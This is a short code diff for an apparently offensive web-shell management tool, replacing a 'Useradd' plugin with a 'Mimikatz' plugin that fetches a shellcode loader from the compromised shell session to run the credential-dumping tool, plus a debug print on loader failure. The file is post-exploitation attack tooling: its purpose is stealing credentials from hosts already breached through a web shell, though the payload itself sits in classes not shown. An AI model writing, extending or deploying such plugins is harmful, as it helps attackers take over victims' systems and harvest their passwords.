@@ -1,23 +1,10 @@
-//
-// Source code recreated from a .class file by IntelliJ IDEA
-// (powered by FernFlower decompiler)
-//
-
 package shells.plugins.java;
 
 import core.annotation.PluginAnnotation;
 import shells.plugins.generic.ShellcodeLoader;
 
-@PluginAnnotation(
-        payloadName = "JavaDynamicPayload",
-        Name = "Useradd",
-        DisplayName = "Useradd"
-)
-public class Useradd extends shells.plugins.generic.Useradd {
-    public Useradd() {
-
-    }
-
+@PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "Mimikatz", DisplayName = "Mimikatz")
+public class Mimikatz extends shells.plugins.generic.Mimikatz {
     protected ShellcodeLoader getShellcodeLoader() {
         return (ShellcodeLoader) this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
     }
@@ -28,6 +15,7 @@ public class Useradd extends shells.plugins.generic.Useradd {
             loader.init(this.shellEntity);
             return loader;
         } catch (Throwable t) {
+            System.out.println("[Mimikatz] createLoader failed: " + t);
             return null;
         }
     }
